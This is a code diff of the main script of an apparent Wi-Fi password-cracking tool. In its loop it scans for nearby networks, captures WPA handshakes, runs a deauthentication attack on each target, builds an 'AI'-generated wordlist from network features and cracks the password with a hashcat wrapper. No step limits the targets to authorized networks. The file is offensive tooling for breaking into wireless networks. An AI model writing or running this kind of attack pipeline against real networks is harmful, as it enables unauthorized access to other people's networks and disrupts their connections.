@@ -1,27 +1,40 @@
 from network.scanner import scan_networks
 from network.handshake import capture_handshake
-from cracking.crack_manager import crack_password
-from ai.feature_extractor import extract_features
+from network.deauth import deauth_attack
 from cracking.wordlist_manager import WordlistManager
+from cracking.hashcat_wrapper import crack_password
+from ai.feature_extractor import extract_features
 
 def main():
-    # Step 1: Scan networks
+    # Step 1: Scan for networks
+    print("[*] Scanning for networks...")
     networks = scan_networks()
+    
+    if not networks:
+        print("[!] No networks found.")
+        return
+
     for network in networks:
-        print(f"Targeting: {network['ssid']} ({network['bssid']})")
+        ssid = network["ssid"]
+        bssid = network["bssid"]
+        channel = network["channel"]
+        print(f"[*] Targeting network: {ssid} ({bssid})")
 
         # Step 2: Capture handshake
-        capture_handshake(network["bssid"], network["channel"])
+        handshake_file = capture_handshake(bssid, channel)
 
-        # Step 3: Extract network features
-        features = extract_features(network["ssid"], network["bssid"])
+        # Step 3: Perform deauthentication attack
+        deauth_attack(bssid)
 
-        # Step 4: Generate wordlist with AI
+        # Step 4: Extract network features
+        features = extract_features(ssid, bssid)
+
+        # Step 5: Generate wordlist with AI
         wordlist_manager = WordlistManager()
-        wordlist_path = wordlist_manager.generate_wordlist(features)
+        wordlist = wordlist_manager.generate_wordlist(features)
 
-        # Step 5: Crack password
-        crack_password("data/captures/handshake.hccapx", wordlist_path)
+        # Step 6: Crack password
+        crack_password(handshake_file, wordlist)
 
 if __name__ == "__main__":
     main()
